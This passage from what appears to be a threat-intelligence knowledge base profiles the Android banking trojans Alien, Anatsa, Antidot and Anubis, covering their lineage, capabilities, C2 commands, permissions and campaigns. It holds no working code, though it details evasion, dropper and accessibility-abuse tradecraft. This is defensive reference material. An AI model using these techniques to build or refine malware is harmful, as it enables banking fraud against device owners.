commercially significant fork of Cerberus after its source code leaked in September 2020. Rented as MaaS on underground forums from early 2020, it bridged the gap between the original Cerberus operation and the next-generation trojans that followed. ThreatFabric documented Alien as actively operating even before the public Cerberus source leak, running concurrently with the dying Cerberus MaaS. The same threat actor behind Alien, tracked as \"DukeEugene,\" later launched Ermac in 2021 and Hook in 2023, making Alien the critical stepping stone in the Cerberus lineage.</p>"},{"location":"malware/families/alien/#overview","title":"Overview","text":"Attribute Details First Seen January 2020 Last Seen Mid-2021 (superseded by Ermac) Status Inactive as standalone; code lives on through Ermac and Hook Type Banking trojan (MaaS) Attribution \"DukeEugene\" (also behind BlackRock, Ermac, Hook) Aliases Alien Bot, Alien Banker Rental Price $3,000/month (underground forums)"},{"location":"malware/families/alien/#vendor-names","title":"Vendor Names","text":"Vendor Name ThreatFabric Alien Kaspersky Trojan-Banker.AndroidOS.Cerana ESET Android/TrojanDropper.Agent Microsoft TrojanSpy:AndroidOS/Alienbot Trend Micro AndroidOS_Alienbot Fortinet Android/Agent.GJJ!tr Dr.Web Android.BankBot.Alien Symantec Trojan.Gen.MBT"},{"location":"malware/families/alien/#origin-and-lineage","title":"Origin and Lineage","text":"<p>Alien is a direct fork of Cerberus v1 source code. ThreatFabric's analysis proved this through code structure comparison: Alien retains the core Cerberus architecture for overlay injection, accessibility abuse, and C2 communication, layering new capabilities on top. The fork was active from January 2020, meaning the author had access to the Cerberus source months before the public leak in September 2020. This aligns with the timeline of the Cerberus team's internal collapse, suggesting the code was obtained through private channels or team members.</p> <p>DukeEugene was simultaneously operating BlackRock, another Android banking trojan discovered in mid-2020. ThreatFabric observed BlackRock sample production cease as Ermac emerged in August 2021, confirming DukeEugene transitioned from Alien/BlackRock to Ermac as a consolidated MaaS offering.</p> <p>The lineage is direct and well-documented:</p> <pre><code>Cerberus (2019) --&gt; Alien (2020) --&gt; Ermac (2021) --&gt; Hook (2023)\n</code></pre> <p>Each successor inherited the predecessor's codebase and added capabilities. NCC Group confirmed this chain through code comparison when analyzing Hook's relationship to Ermac.</p>"},{"location":"malware/families/alien/#distribution","title":"Distribution","text":"<p>Alien operators deployed standard Android banking trojan delivery methods, with a preference for fake app campaigns.</p> Vector Details Phishing sites Typosquatted domains serving APKs disguised as legitimate apps Fake apps Posed as fitness trackers, Flash Player updates, coronavirus information apps, Google Chrome updates Smishing SMS messages linking to phishing download pages Third-party stores APKs distributed through unofficial Android app markets Social media Lure posts directing victims to download pages <p>Distribution infrastructure was shared across DukeEugene's operations. ThreatFabric noted that COVID-19-themed lures were heavily used during 2020, with fake government health apps and pandemic information tools serving as delivery vehicles.</p>"},{"location":"malware/families/alien/#capabilities","title":"Capabilities","text":"<p>Alien inherited all of Cerberus v1's functionality and introduced several features that would define the next generation.</p> Capability Implementation Overlay attacks WebView-based injects via accessibility service foreground detection, targeting 226+ banking and crypto apps Notification sniffer Abuses <code>BIND_NOTIFICATION_LISTENER_SERVICE</code> to read all device notifications, capturing 2FA codes from banking apps, authenticators, and email clients TeamViewer RAT Silently installs and launches TeamViewer for full remote device control, enabling manual fraud operations Keylogging Accessibility-based keystroke capture across all applications SMS interception Read, send, and forward SMS messages for OTP theft Contact harvesting Exfiltrate contact list to C2 Call forwarding Forward incoming calls to attacker-controlled numbers App listing Enumerate installed packages to determine overlay targets Self-protection Hide app icon, prevent uninstallation via device admin abuse Google Authenticator theft Read 2FA codes directly from Authenticator app UI via accessibility events"},{"location":"malware/families/alien/#notification-sniffer","title":"Notification Sniffer","text":"<p>The notification sniffer was Alien's most significant addition over Cerberus. By requesting the <code>BIND_NOTIFICATION_LISTENER_SERVICE</code> permission and using accessibility to auto-grant it, Alien gained passive access to every notification on the device. This captured 2FA codes from banking apps that deliver OTPs via push notification rather than SMS, a blind spot in Cerberus's SMS-only interception.</p>"},{"location":"malware/families/alien/#teamviewer-integration","title":"TeamViewer Integration","text":"<p>Rather than implementing custom VNC or screen streaming, Alien took a shortcut: it silently downloaded and installed TeamViewer, then used accessibility to auto-grant its permissions and initiate sessions. This gave operators full remote control without developing RAT functionality from scratch. The approach was effective but noisy, as TeamViewer's presence on a device is detectable.</p>"},{"location":"malware/families/alien/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/alien/#accessibility-abuse","title":"Accessibility Abuse","text":"<p>Alien's core loop follows the Cerberus pattern with enhancements:</p> <ol> <li>Persistent prompt forces the user to enable accessibility service</li> <li>Once enabled, auto-grants SMS, phone, contacts, and notification listener permissions</li> <li>Monitors <code>TYPE_WINDOW_STATE_CHANGED</code> events for foreground app detection</li> <li>Triggers overlay injection when target apps enter foreground</li> <li>Notification listener service captures all push notifications passively</li> <li>TeamViewer installed and configured for remote access sessions</li> </ol>"},{"location":"malware/families/alien/#c2-communication","title":"C2 Communication","text":"<p>Alien's C2 protocol is an evolution of Cerberus's HTTP-based approach:</p> <ul> <li>HTTP POST requests to hardcoded C2 domains</li> <li>Data encrypted before transmission (updated encryption from Cerberus baseline)</li> <li>Bot registers on first launch with device fingerprint</li> <li>Regular polling intervals for command retrieval</li> <li>Inject pages fetched from C2 by target package name</li> </ul> <p>Key C2 commands:</p> Command Action <code>push</code> Display push notification to lure user into opening target app <code>startApp</code> Launch specified application to trigger overlay <code>getContacts</code> Exfiltrate contact list <code>sentSMS</code> Send SMS from victim device <code>startForward</code> Forward calls to attacker number <code>startVNC</code> Initialize TeamViewer remote session <code>getAccounts</code> Steal accounts stored on device <code>getInstalledApps</code> Enumerate installed packages"},{"location":"malware/families/alien/#anti-analysis","title":"Anti-Analysis","text":"Technique Method Emulator detection Checks build properties, SIM state, and hardware fingerprints String obfuscation Critical strings encrypted and resolved at runtime Delayed activation Payload dormant until specific conditions met Icon hiding App icon removed from launcher after initial setup"},{"location":"malware/families/alien/#target-regions-and-financial-institutions","title":"Target Regions and Financial Institutions","text":"<p>Alien cast a wide net, with inject kits covering institutions across multiple continents. ThreatFabric reported coverage of 226+ applications.</p> Region Countries Western Europe Spain, France, Italy, Germany, UK, Belgium, Netherlands Eastern Europe Turkey, Poland North America United States, Canada Asia-Pacific Australia Cryptocurrency MetaMask, Trust Wallet, Coinbase, Blockchain.com <p>Spanish and Turkish financial institutions were particularly well-represented in the inject kit, consistent with Cerberus's original targeting focus. The addition of cryptocurrency wallet targets reflected the broader 2020-era trend of banking trojans expanding into crypto theft.</p>"},{"location":"malware/families/alien/#notable-campaigns","title":"Notable Campaigns","text":"<p>January 2020: Alien first observed operating as a rented MaaS alongside the still-active Cerberus. ThreatFabric identified it as a Cerberus v1 fork with enhanced capabilities.</p> <p>Mid-2020: COVID-19-themed distribution campaigns peaked. Alien samples posed as pandemic tracking apps, government health information tools, and coronavirus safety applications.</p> <p>July 2020: Cerberus's author put the project up for auction. Alien positioned as the active successor for operators migrating off Cerberus.</p> <p>September 2020: Cerberus source leaked publicly. Alien's operator base expanded as former Cerberus renters sought a maintained alternative. ThreatFabric published \"Alien: the story of Cerberus' demise\", providing the definitive analysis of the family.</p> <p>Late 2020 - Mid-2021: Alien remained the dominant Cerberus derivative available for rent, targeting European banking customers across multiple campaigns.</p> <p>August 2021: DukeEugene launched Ermac, identified by ThreatFabric as built on the same codebase. Alien campaigns declined as the operator migrated renters to the newer, more capable product.</p>"},{"location":"malware/families/anatsa/","title":"Anatsa","text":"<p>Anatsa is an Android banking trojan that pioneered on-device Automated Transfer System (ATS) fraud through Google Play Store distribution. Active since January 2021, it uses accessibility services to initiate bank transfers directly from the victim's device, bypassing \"new device enrollment\" checks that banks rely on to detect fraud. Its persistent ability to land dropper apps on Google Play, combined with a growing target list of 800+ financial institutions, makes it one of the most operationally successful Android banking trojans.</p>"},{"location":"malware/families/anatsa/#overview","title":"Overview","text":"Attribute Details First Seen January 2021 Status Active (2025) Type Banking trojan, ATS fraud Aliases TeaBot, Toddler Attribution Unknown, financially motivated Distribution Google Play Store droppers, sideloading"},{"location":"malware/families/anatsa/#origin-and-lineage","title":"Origin and Lineage","text":"<p>Cleafy's Threat Intelligence team discovered Anatsa in early January 2021 while monitoring banking fraud campaigns targeting European institutions. Cleafy tracked it under the name TeaBot. The malware appeared to be written from scratch with no codebase overlap with existing families like Cerberus, Anubis, or FluBot.</p> <p>ThreatFabric independently identified the same family and tracked it as Anatsa, first spotting dropper apps on Google Play in June 2021. By November 2021, ThreatFabric had documented six distinct Anatsa droppers that had been published to the Play Store since that initial June discovery.</p> <p>The family has been under continuous development since its emergence. The operators consistently refine their dropper strategy, rotating between PDF readers, QR scanners, file managers, and document apps to pass Google Play review.</p>"},{"location":"malware/families/anatsa/#distribution","title":"Distribution","text":"<p>Anatsa's primary distribution vector is the Google Play Store through dropper apps that initially pass review as legitimate utilities, then receive a malicious update after accumulating installs.</p> Date Dropper Type Installs Source June 2021 Document scanner ~10,000 ThreatFabric March 2022 QR code reader, PDF reader ~10,000+ Hacker News March 2023 PDF reader, business suite 30,000+ ThreatFabric November 2023 Various utility apps 100,000+ (5 waves) ThreatFabric February 2024 Utility apps 150,000+ Bleeping Computer <p>The dropper pattern is consistent: apps are published as functional utilities, spend several weeks building installs and positive reviews, then push a malicious update. The payload is fetched from C2 rather than bundled in the dropper APK, making static detection at upload time difficult.</p> <p>Cleafy documented the global expansion of distribution, noting that within a year of initial discovery, the target list grew from 60 to over 400 financial apps.</p>"},{"location":"malware/families/anatsa/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/anatsa/#core-features","title":"Core Features","text":"Capability Implementation Overlay attacks WebView-based injects downloaded from C2, triggered by accessibility events ATS fraud Accessibility service performs transfers in the real banking app Keylogging Captures all text input via accessibility event monitoring Screen streaming Real-time device screen fed to operator on demand SMS interception Reads, intercepts, and hides incoming SMS for 2FA bypass Google Authenticator theft Reads TOTP codes from authenticator apps via accessibility Remote interaction Full device control through accessibility gestures"},{"location":"malware/families/anatsa/#ats-implementation","title":"ATS Implementation","text":"<p>The ATS engine is Anatsa's primary differentiator. Once the victim opens a banking app and logs in (credentials captured via overlay or keylogger), the malware:</p> <ol> <li>Waits for the session to be established</li> <li>Uses accessibility services to navigate the banking app</li> <li>Fills in transfer details (recipient, amount) from C2-provided instructions</li> <li>Confirms the transaction using captured 2FA codes</li> <li>Returns to the previous screen state</li> </ol> <p>This happens on the victim's own device, within the victim's active banking session, making it invisible to server-side fraud detection that looks for new device registrations or unusual device fingerprints.</p>"},{"location":"malware/families/anatsa/#anti-analysis","title":"Anti-Analysis","text":"<p>Zscaler ThreatLabz documented several evasion techniques in recent samples:</p> Technique Details String encryption DES encryption with dynamically generated keys DEX payload hiding Concealed within JSON files, dropped at runtime, deleted after loading Archive corruption Invalid compression/encryption flags to defeat static analysis Emulator detection Checks device model and environment properties Multi-stage loading Dropper fetches payload from C2, payload decrypts and loads secondary DEX"},{"location":"malware/families/anatsa/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/anatsa/#c2-communication","title":"C2 Communication","text":"<p>C2 traffic is encrypted using single-byte XOR (key: 0x42 / 66 decimal) and transmitted as JSON payloads. Configuration data includes domain lists, inject version numbers, keylogger settings, and command queues.</p> <p>The C2 infrastructure provides:</p> <ul> <li>Target app lists and corresponding inject URLs</li> <li>ATS scripts specifying transfer parameters</li> <li>Updated configurations for regional targeting</li> <li>Commands for on-demand screen streaming sessions</li> </ul>"},{"location":"malware/families/anatsa/#accessibility-service-permissions","title":"Accessibility Service Permissions","text":"<p>Once installed, Anatsa requests the accessibility service permission. Upon receiving it, the malware auto-enables additional permissions through accessibility:</p> <ul> <li><code>SYSTEM_ALERT_WINDOW</code> for overlay display</li> <li><code>READ_SMS</code> and <code>RECEIVE_SMS</code> for 2FA interception</li> <li><code>USE_FULL_SCREEN_INTENT</code> for phishing prompts</li> </ul>"},{"location":"malware/families/anatsa/#target-regions-and-financial-institutions","title":"Target Regions and Financial Institutions","text":"<p>Anatsa's targeting has expanded significantly since 2021.</p> Period Primary Targets Early 2021 Spain, Germany, Italy Late 2021 Netherlands, Belgium, UK 2022 Expanded EU (Austria, Switzerland) 2023 US, UK, DACH region (Germany, Austria, Switzerland) Late 2023 Slovakia, Slovenia, Czech Republic 2024 North America (US, Canada) <p>ThreatFabric reported the North American expansion in 2024, noting the operators used the same proven Play Store dropper playbook refined across years of European campaigns.</p> <p>As of late 2024, Zscaler ThreatLabz estimates Anatsa targets over 800 financial institutions and cryptocurrency platforms worldwide.</p>"},{"location":"malware/families/anatsa/#notable-campaigns","title":"Notable Campaigns","text":"<p>January-May 2021: Cleafy's initial discovery documented TeaBot targeting 60 European banks across Spain, Germany, and Italy. The trojan combined overlay attacks with accessibility-based device interaction.</p> <p>June-November 2021: ThreatFabric identified six droppers on Google Play delivering Anatsa. This campaign established the Play Store dropper-as-delivery pattern that would define Anatsa's operations going forward.</p> <p>March 2023: ThreatFabric documented a campaign targeting UK and DACH region banks through PDF reader dropper apps, accumulating 30,000+ installs before detection.</p> <p>June 2023: The Hacker News reported Anatsa expanding to target US, UK, German, Austrian, and Swiss banking customers.</p> <p>November 2023-January 2024: ThreatFabric tracked five distinct campaign waves targeting different European regions sequentially, with combined dropper installs exceeding 100,000.</p> <p>February 2024: Anatsa bypassed updated Google Play security to land new dropper apps, demonstrating the operators' ability to adapt to evolving store protections.</p> <p>May-July 2025: ThreatFabric documented a third North American campaign targeting US and Canadian banking customers via Google Play. A dropper disguised as a PDF reader was published on May 7, 2025, and reached #4 in the \"Top Free - Tools\" category by June 29, 2025, accumulating approximately 90,000 downloads. After installation, the app pushed a fake \"PDF Update\" notification containing the Anatsa payload. The operators reused the same proven Play Store dropper playbook refined across years of European campaigns.</p>"},{"location":"malware/families/antidot/","title":"Antidot","text":"<p>Antidot is an Android banking trojan discovered by Cyble in May 2024 that combines overlay attacks, keylogging, and VNC-based remote control over a persistent WebSocket connection to its C2 server. Named after a string found in its source code, the malware masquerades as Google Play update pages rendered in multiple languages to target victims across diverse regions. Its bidirectional WebSocket protocol enables real-time command execution, with 35 distinct commands covering everything from SMS collection and USSD initiation to camera capture and call redirection. In December 2024, Zimperium documented AppLite, a more advanced variant targeting corporate employees through fake job application phishing, expanding the target list to 172 applications across banking, cryptocurrency, and finance. A third variant, PhantomCall, was documented by IBM Trusteer Labs in 2025, adding voice call hijacking to the arsenal.</p>"},{"location":"malware/families/antidot/#overview","title":"Overview","text":"Attribute Details First Seen May 2024 Status Active, multiple variants in circulation Type Banking trojan, RAT Aliases AppLite Banker, PhantomCall Attribution Unknown Distribution Fake Google Play update pages, fake job application phishing (AppLite), fake Chrome apps (PhantomCall)"},{"location":"malware/families/antidot/#origin-and-lineage","title":"Origin and Lineage","text":"<p>Cyble Research and Intelligence Labs (CRIL) first identified Antidot on May 6, 2024, during analysis of a sample masquerading as a Google Play update application. The trojan appeared fully formed with overlay, keylogging, and VNC capabilities, suggesting a period of private development before public distribution began. Custom encryption routines for string obfuscation and gibberish class names indicated deliberate anti-analysis engineering from the start.</p> <p>By December 2024, Zimperium's zLabs team identified AppLite, a significantly evolved variant built on the original Antidot codebase. AppLite shifted distribution from generic update lures to targeted social engineering: threat actors impersonated HR representatives from legitimate companies, sending phishing emails with fabricated job offers that directed victims to malicious landing pages. The variant expanded the target application list from the original set to 172 applications (95 banking, 62 cryptocurrency, 13 additional financial) and introduced APK format manipulation techniques to evade static analysis tools.</p> <p>In 2025, IBM Trusteer Labs uncovered PhantomCall, a third variant distributed through fake Chrome application icons. PhantomCall introduced voice call hijacking, automatically rerouting incoming calls to attacker-controlled phone numbers. This capability is designed to intercept fraud alert calls from banks and financial institutions, preventing victims from receiving warnings while the attacker maintains access to their accounts. The campaign targeted users across Spain, Italy, France, the United States, Canada, the UAE, and India.</p>"},{"location":"malware/families/antidot/#distribution","title":"Distribution","text":"Vector Details Fake Google Play updates Phishing pages showing localized update prompts in multiple languages Fake job applications (AppLite) Phishing emails impersonating HR recruiters with links to malicious landing pages Fake Chrome apps (PhantomCall) Dropper disguised with Google Chrome icon, using WebView to mimic Play Store update flow <p>The original Antidot distribution relied on fake Google Play update pages that render in the victim's device language. When a victim visits the phishing page, the malware displays a localized update prompt with a \"Continue\" button that redirects to Android's Accessibility settings, granting the malware the permissions it needs to operate.</p> <p>AppLite's distribution is more targeted. Threat actors craft emails posing as recruiters from recognizable companies, offering job opportunities. The phishing page manipulates victims into downloading a dropper application disguised as \"EmployeesCRM\" or other enterprise tools. The dropper presents a fake login screen, and after account creation, forces the victim to install an \"update\" on subsequent launches. This update is the AppLite payload. Zimperium noted that the dropper manipulates the ZIP format of APK files and Android Manifest structures to break analysis tool parsers and evade detection.</p>"},{"location":"malware/families/antidot/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/antidot/#core-features","title":"Core Features","text":"Capability Implementation Overlay attacks WebView-based injection screens triggered when targeted apps are opened, verified by package name matching Keylogging Accessibility service captures keystrokes, exfiltrated as Base64-encoded data with timestamps via \"getKeys\" command VNC remote control MediaProjection-based screen streaming with touch simulation, swipe, and recent apps navigation SMS collection Reads and exfiltrates all SMS messages from the device USSD execution Initiates USSD requests on the victim's behalf Camera capture Remotely activates the device camera and takes photographs Screen lock control Locks and unlocks the device remotely Call redirection (PhantomCall) Reroutes all incoming calls to attacker-specified phone numbers App icon hiding Conceals the malware's presence from the device launcher"},{"location":"malware/families/antidot/#overlay-and-credential-theft","title":"Overlay and Credential Theft","text":"<p>When the malware detects a targeted application being launched, it verifies the package name against its injection list. On a match, it creates an overlay window on top of the legitimate app and loads a phishing page into a WebView. As the victim types credentials into the overlay, each keystroke generates a \"ping message\" over the WebSocket connection, transmitting Base64-encoded keylog data along with timestamps and the target application name. This dual approach of visual deception and real-time keystroke capture ensures credential theft even if the overlay is only partially convincing.</p>"},{"location":"malware/families/antidot/#remote-control","title":"Remote Control","text":"<p>Antidot's VNC implementation uses Android's MediaProjection API to stream the device screen to the operator. Through the WebSocket channel, operators can perform taps and swipes at arbitrary coordinates, navigate through apps, and interact with any interface element on the device. The 35-command set covers device manipulation (brightness adjustment, sleep mode, screen lock), information gathering (SMS, contacts, keystroke logs), and interface control (overlay window management, app launching).</p>"},{"location":"malware/families/antidot/#multi-language-targeting","title":"Multi-Language Targeting","text":"<p>The malware displays fake update pages in English, Spanish, French, German, Italian, Portuguese, Russian, and Romanian, indicating broad geographic targeting. AppLite further extended language support to include Czech and Turkish, while PhantomCall campaigns concentrated on Spain, the UAE, Italy, France, the US, Canada, and India.</p>"},{"location":"malware/families/antidot/#permissions","title":"Permissions","text":"Permission Purpose BIND_ACCESSIBILITY_SERVICE Keylogging, overlay injection, UI navigation for VNC SYSTEM_ALERT_WINDOW Display overlay windows over banking apps READ_SMS Read SMS messages for OTP theft RECEIVE_SMS Intercept incoming SMS in real-time SEND_SMS Send SMS from victim device READ_CONTACTS Exfiltrate contact list READ_PHONE_STATE Device fingerprinting, phone number collection CALL_PHONE USSD execution and call redirection (PhantomCall) CAMERA Remote camera capture INTERNET WebSocket and HTTP C2 communication FOREGROUND_SERVICE Persistent background operation RECEIVE_BOOT_COMPLETED Restart after device reboot REQUEST_INSTALL_PACKAGES Install additional payloads WAKE_LOCK Keep device awake during remote sessions"},{"location":"malware/families/antidot/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/antidot/#c2-communication","title":"C2 Communication","text":"<p>Antidot initiates contact with its C2 server through an HTTP request, then upgrades to a WebSocket connection using the socket.io library for persistent, bidirectional communication. Client messages (\"ping\") carry Base64-encoded stolen data, while server responses (\"pong\") deliver plaintext commands. This persistent connection enables real-time command execution and continuous data exfiltration without the latency of polling-based approaches.</p>"},{"location":"malware/families/antidot/#anti-analysis-techniques","title":"Anti-Analysis Techniques","text":"<p>The original Antidot employs custom string encryption and obfuscation with gibberish class names to hinder static analysis. AppLite takes evasion further by manipulating the ZIP file format of its APK and altering Android Manifest structures, causing standard analysis tools and parsers to fail when processing the file. These manipulations allow the malware to pass through automated security scanning while remaining functional on target devices.</p>"},{"location":"malware/families/antidot/#c2-infrastructure","title":"C2 Infrastructure","text":"Component Details Initial handshake HTTP GET request with device fingerprint Persistent channel WebSocket via socket.io library for bidirectional communication Client messages \"ping\" events carrying Base64-encoded stolen data Server messages \"pong\" events delivering plaintext commands Command set 35 distinct commands covering device manipulation, data collection, and overlay management Encryption Custom encryption routines for string obfuscation; Base64 encoding for data in transit"},{"location":"malware/families/antidot/#evolution","title":"Evolution","text":"Variant Period Key Changes Antidot (original) May 2024 35 commands, WebSocket C2, multi-language fake update lures, keylogging + VNC + overlays AppLite December 2024 Enterprise-targeted distribution via fake job phishing, 172 app targets (95 banking, 62 crypto, 13 finance), APK format manipulation for evasion PhantomCall 2025 Voice call hijacking to intercept bank fraud alerts, fake Chrome app distribution, global campaign expansion"},{"location":"malware/families/antidot/#target-regions","title":"Target Regions","text":"Variant Primary Targets Antidot (original) Europe broadly, with localized lures for German, French, Spanish, Russian, Portuguese, Romanian, and English speakers AppLite Corporate employees globally, with phishing campaigns in English PhantomCall Spain, UAE, Italy, France, US, Canada, India"},{"location":"malware/families/antidot/#notable-campaigns","title":"Notable Campaigns","text":"<p>May 2024: Cyble disclosed Antidot after identifying samples disguised as Google Play update applications. Analysis revealed 35 distinct commands, WebSocket-based C2 communication, and multi-language fake update pages targeting users across European and Russian-speaking regions.</p> <p>December 2024: Zimperium published findings on AppLite, an Antidot variant distributed through fake job recruitment phishing. The campaign targeted corporate mobile devices with a dropper disguised as enterprise software, delivering a banking trojan capable of targeting 172 financial applications. The shift to employment-themed social engineering marked a deliberate pivot toward enterprise environments.</p> <p>2025: IBM Trusteer Labs revealed PhantomCall, an Antidot variant adding call hijacking capabilities. Distributed as fake Chrome applications, PhantomCall rerouted incoming voice calls to attacker-controlled numbers, enabling interception of bank fraud alerts. The campaign demonstrated aggressive global distribution across Europe, North America, the Middle East, and Asia.</p>"},{"location":"malware/families/antidot/#related-families","title":"Related Families","text":"Family Relationship Vultur Both use VNC-based remote control via MediaProjection for real-time device access, though Vultur pioneered this approach using AlphaVNC while Antidot implements it over WebSocket. Hook Both combine overlay attacks with VNC-like screen streaming, representing the convergence of banking trojan and RAT capabilities in modern Android malware. Brokewell Both feature rapid development cycles with frequent new capabilities, and both combine data-stealing with remote control. FakeCalls PhantomCall's call hijacking technique parallels FakeCalls' approach of intercepting and manipulating voice calls to banks."},{"location":"malware/families/antidot/#detection","title":"Detection","text":"Indicator Type Details WebSocket C2 Persistent socket.io WebSocket connections from a utility/update app Fake update UI WebView rendering Google Play update page with localized language Custom encryption Non-standard string encryption patterns in APK classes APK manipulation Malformed ZIP headers or Android Manifest structures (AppLite) MediaProjection abuse App requesting screen capture permission without legitimate screen-sharing functionality Call forwarding changes Unexpected <code>CallRedirectionService</code> registration (PhantomCall)"},{"location":"malware/families/antidot/#references","title":"References","text":"<ul> <li>Cyble - New Antidot Android Banking Trojan (May 2024)</li> <li>Zimperium - AppLite: A New Antidot Variant Targeting Mobile Employee Devices (December 2024)</li> <li>IBM Trusteer Labs - PhantomCall: Antidot Variant in Fake Chrome Apps (2025)</li> </ul>"},{"location":"malware/families/anubis/","title":"Anubis","text":"<p>Anubis was one of the first Android banking trojans to combine overlay attacks, keylogging, screen recording, SMS interception, and file encryption into a single package. Developed by the actor \"maza-in\" and sold as a private MaaS operation from late 2017, it set the template for nearly every banking trojan that followed. Its 2019 source code leak seeded multiple successor families, most notably GodFather.</p>"},{"location":"malware/families/anubis/#overview","title":"Overview","text":"Property Value First Seen Late 2017 (evolved from BankBot codebase published December 2016) Last Seen / Status Active development ended ~Q1 2019 (developer arrested); leaked source still reused in campaigns through 2021 Type Banking trojan, infostealer, ransomware Attribution \"maza-in\" (Russian-speaking developer, arrested March 2019) Aliases BankBot Anubis, Android.BankBot.Anubis, Anubis II"},{"location":"malware/families/anubis/#origin-and-lineage","title":"Origin and Lineage","text":"<p>In December 2016, maza-in published a tutorial titled \"Android BOT from scratch\" on the exploit.in forum, sharing full source code for both the Android client and the PHP C2 panel. This became the BankBot family. Maza-in continued developing the codebase privately, adding overlay injection, keylogging, and remote access features. By late 2017 the enhanced version was marketed as \"Anubis\" to a limited set of private buyers.</p> <p>ThreatFabric's analysis documents how Anubis II diverged from the original BankBot code with substantially expanded capabilities. In early 2019, maza-in vanished from underground forums. The backend code and an unobfuscated APK were leaked publicly in January 2019, enabling any actor to spin up their own Anubis operation. This leak directly influenced the development of GodFather, Ginp, and multiple private forks.</p>"},{"location":"malware/families/anubis/#distribution","title":"Distribution","text":"<p>Anubis operators relied on two primary delivery vectors:</p> <p>Google Play droppers: Apps disguised as utility tools (flashlight apps, battery savers, currency converters) passed Google Bouncer checks, then downloaded the Anubis payload post-install. ThreatFabric documented how dropper campaigns maintained \"normal\" app behavior for days before activating, evading automated analysis for months.</p> <p>Phishing campaigns: SMS and email lures directed victims to fake app download pages. Cofense identified campaigns distributing APKs via phishing emails that mimicked invoice notifications and package delivery alerts.</p> <p>Some campaigns also used Twitter and Telegram channels to distribute C2 addresses to already-infected devices, decoupling the initial dropper from the active infrastructure.</p>"},{"location":"malware/families/anubis/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/anubis/#core-feature-set","title":"Core Feature Set","text":"Capability Implementation Overlay injection Monitors running apps via <code>UsageStatsManager</code>, injects phishing WebView over targeted banking/crypto apps Keylogging Accessibility Service captures all text input events across the device Screen recording MediaProjection API streams device screen to C2 SMS interception Intercepts, reads, and hides incoming SMS (OTP/2FA theft) File encryption RC4-encrypts files on internal/external storage, appends <code>.AnubisCrypt</code> extension SOCKS5 proxy Routes network traffic through infected device Sound recording Records audio via device microphone File exfiltration Browses and uploads files from device storage VNC Remote device control through accessibility-based interaction Contact theft Exfiltrates full contact list App install/uninstall Silently installs additional payloads or removes competing malware Google Play Protect disable Uses accessibility to navigate settings and disable Play Protect"},{"location":"malware/families/anubis/#version-evolution","title":"Version Evolution","text":"Version Period Key Additions BankBot (alpha) Dec 2016 Overlay attacks, SMS interception, basic C2 Anubis 1.x Late 2017 Keylogging, screen recording, sound recording, SOCKS5 proxy Anubis 2.0 Mid 2018 VNC remote control, file browser, network proxy Anubis 2.5 Late 2018 Ransomware module (RC4 file encryption), expanded target list to 300+ apps Post-leak variants 2019-2021 Various actors added obfuscation, updated target lists, minor feature changes"},{"location":"malware/families/anubis/#permissions","title":"Permissions","text":"Permission Purpose BIND_ACCESSIBILITY_SERVICE Keylogging, VNC remote control, overlay injection, Play Protect disabling SYSTEM_ALERT_WINDOW WebView overlay windows for credential phishing BIND_DEVICE_ADMIN Device admin privileges for persistence and anti-uninstall PACKAGE_USAGE_STATS Monitor foreground apps via UsageStatsManager for overlay triggering READ_SMS Read SMS for OTP/2FA theft RECEIVE_SMS Intercept incoming SMS SEND_SMS Send SMS from victim device READ_CONTACTS Contact list exfiltration READ_EXTERNAL_STORAGE File browsing and exfiltration, ransomware target WRITE_EXTERNAL_STORAGE File encryption (ransomware module) RECORD_AUDIO Sound recording via device microphone READ_PHONE_STATE Device fingerprinting INTERNET HTTP C2 communication and SOCKS5 proxy RECEIVE_BOOT_COMPLETED Restart after device reboot REQUEST_INSTALL_PACKAGES Silent installation of additional payloads REQUEST_DELETE_PACKAGES Remove competing malware"},{"location":"malware/families/anubis/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/anubis/#c2-communication","title":"C2 Communication","text":"<p>Anubis retrieves its initial C2 address from Twitter or Telegram channels, then switches to direct HTTP communication. The bot sends POST requests to the C2 server containing device data encrypted with a key provided by the server during the initial handshake. Commands are polled at regular intervals.</p> <p>The C2 panel (PHP-based) manages bot registration, overlay injection delivery, command dispatch, and exfiltrated data storage. Operators configure target application lists and overlay HTML/WebView templates through the panel.</p>"},{"location":"malware/families/anubis/#encryption","title":"Encryption","text":"<p>RC4 is used in two contexts:</p> <ul> <li>C2 traffic: Request/response payloads are RC4-encrypted with a server-provided key</li> <li>Ransomware module: Files on device storage are encrypted with RC4, original files deleted, <code>.AnubisCrypt</code> extension appended. The decryption key is held server-side</li> </ul>"},{"location":"malware/families/anubis/#overlay-mechanism","title":"Overlay Mechanism","text":"<p>When a targeted app launches, Anubis detects it via <code>UsageStatsManager</code> or Accessibility events and immediately pushes a WebView overlay matching the target app's login screen. Credentials entered into the overlay are POSTed to the C2. The overlay HTML is fetched from the C2, allowing operators to update phishing templates without pushing a new APK.</p>"},{"location":"malware/families/anubis/#persistence","title":"Persistence","text":"<p>Anubis requests Device Admin privileges early in the infection chain, preventing easy uninstallation. It also disables Google Play Protect by navigating the settings UI through Accessibility Service actions.</p>"},{"location":"malware/families/anubis/#c2-infrastructure","title":"C2 Infrastructure","text":"Component Details Initial C2 resolution Twitter or Telegram channels hosting encrypted C2 addresses Primary protocol HTTP POST with RC4-encrypted, Base64-encoded payloads Encryption RC4 with server-provided key (key exchanged during initial handshake) Panel PHP-based web interface for bot management, overlay delivery, command dispatch Overlay hosting WebView HTML templates served from C2, updatable without new APK SOCKS5 proxy Infected devices used as network proxies for traffic routing Dead drop resolvers Twitter and Telegram used as fallback C2 channels"},{"location":"malware/families/anubis/#target-regions-and-financial-institutions","title":"Target Regions and Financial Institutions","text":"<p>Anubis campaigns targeted financial apps across a broad geographic range, with concentration in:</p> Region Notable Targets Europe Banks in France, Germany, Spain, Italy, Poland, Turkey North America Wells Fargo, Chase, Citibank, Bank of America Australia Major Australian banking apps Middle East Turkish banking apps (primary early targets) Crypto Coinbase, Blockchain.com, various wallet apps <p>At peak operation, Anubis maintained overlay templates for over 394 financial applications, including banking, cryptocurrency, and e-commerce apps like eBay and Amazon.</p>"},{"location":"malware/families/anubis/#notable-campaigns","title":"Notable Campaigns","text":"<p>Early 2018, Google Play dropper wave: Multiple utility apps on Google Play distributed Anubis payloads. ThreatFabric tracked a botnet of over 5,400 infected devices with 276 harvested banking credential sets from a single C2 server, targeting 420+ 